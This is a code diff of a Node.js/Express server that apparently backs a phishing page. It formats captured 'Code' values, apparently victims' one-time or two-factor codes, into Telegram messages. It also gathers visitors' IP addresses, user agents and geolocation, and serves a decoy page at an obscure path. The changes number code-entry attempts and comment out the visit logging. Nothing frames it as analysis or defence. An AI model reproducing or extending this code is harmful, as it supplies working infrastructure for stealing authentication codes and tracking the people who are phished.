@@ -79,7 +79,7 @@ async function logData(data) {
 
   telegramMessage += "----------------------------------------------------------\n";
 
-  if (data.code) telegramMessage += `Code 1: ${data.code}\n`;
+  if (data.code) telegramMessage += `Code ${data.attempt}: ${data.code}\n`;
   if (data.code2) telegramMessage += `Code 2: ${data.code2}\n`;
 
   telegramMessage += "----------------------------------------------------------\n";
@@ -170,15 +170,15 @@ app.get('/latest-settings-info/latest-settings-info/latest-settings-info', async
   console.log("User-Agent:", userAgent);
 
   const geo = await getGeo(ip);
-  logData({
-    type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip, userAgent,
-    city: geo.city,
-    region: geo.region,
-    country: geo.country,
-    org: geo.org,
-    timezone: geo.timezone,
-    time: new Date().toISOString()
-  });
+  // logData({
+  //   type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip, userAgent,
+  //   city: geo.city,
+  //   region: geo.region,
+  //   country: geo.country,
+  //   org: geo.org,
+  //   timezone: geo.timezone,
+  //   time: new Date().toISOString()
+  // });
   res.sendFile(path.join(__dirname, 'fx.html'));
 });
 async function getGeo(ip) {
